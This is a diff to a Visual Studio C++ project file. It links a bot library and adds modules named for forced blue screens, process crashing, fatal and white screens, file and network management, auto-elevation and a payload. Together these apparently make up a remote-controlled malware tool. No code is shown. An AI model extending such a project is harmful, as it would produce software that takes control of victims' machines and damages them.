@@ -123,27 +123,48 @@
       <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <ConformanceMode>true</ConformanceMode>
       <LanguageStandard>stdcpp20</LanguageStandard>
-      <AdditionalIncludeDirectories>D:\Kukuri Helper\Include;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <AdditionalIncludeDirectories>D:\Kukuri Helper\Include;$(VcpkgRoot)include;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
     </ClCompile>
     <Link>
       <SubSystem>Console</SubSystem>
       <EnableCOMDATFolding>true</EnableCOMDATFolding>
       <OptimizeReferences>true</OptimizeReferences>
       <GenerateDebugInformation>true</GenerateDebugInformation>
-      <AdditionalDependencies>iphlpapi.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalDependencies>iphlpapi.lib;dpp.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalLibraryDirectories>$(VcpkgRoot)lib</AdditionalLibraryDirectories>
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
+    <ClCompile Include="Extension\Bot\HTTPClient.cpp" />
+    <ClCompile Include="Extension\Command\BSoDClient.cpp" />
+    <ClCompile Include="Extension\Command\CrashProcess.cpp" />
+    <ClCompile Include="Extension\Command\FatalScreen.cpp" />
+    <ClCompile Include="Extension\Command\FileManager.cpp" />
+    <ClCompile Include="Extension\Command\NetworkManager.cpp" />
+    <ClCompile Include="Extension\Command\ScreenProcess.cpp" />
+    <ClCompile Include="Extension\Command\TempCreator.cpp" />
+    <ClCompile Include="Extension\Command\VolumeManager.cpp" />
+    <ClCompile Include="Extension\Command\WhiteScreen.cpp" />
     <ClCompile Include="Extension\GetDevice\Hardware.cpp" />
-    <ClCompile Include="Extension\GetDevice\SendHardware.cpp" />
     <ClCompile Include="Extension\Payload\Payload.cpp" />
     <ClCompile Include="Main.cpp" />
+    <ClCompile Include="Module\AutoElevate.cpp" />
     <ClCompile Include="Module\Logger.cpp" />
   </ItemGroup>
   <ItemGroup>
+    <ClInclude Include="Extension\Bot\HTTPClient.hpp" />
+    <ClInclude Include="Extension\Command\BSoDClient.hpp" />
+    <ClInclude Include="Extension\Command\CrashProcess.hpp" />
+    <ClInclude Include="Extension\Command\FatalScreen.hpp" />
+    <ClInclude Include="Extension\Command\FileManager.hpp" />
+    <ClInclude Include="Extension\Command\NetworkManager.hpp" />
+    <ClInclude Include="Extension\Command\ScreenProcess.hpp" />
+    <ClInclude Include="Extension\Command\TempCreator.hpp" />
+    <ClInclude Include="Extension\Command\VolumeManager.hpp" />
+    <ClInclude Include="Extension\Command\WhiteScreen.hpp" />
     <ClInclude Include="Extension\GetDevice\Hardware.hpp" />
-    <ClInclude Include="Extension\GetDevice\SendHardware.hpp" />
     <ClInclude Include="Extension\Payload\Payload.hpp" />
+    <ClInclude Include="Module\AutoElevate.hpp" />
     <ClInclude Include="Module\Logger.hpp" />
   </ItemGroup>
   <ItemGroup>
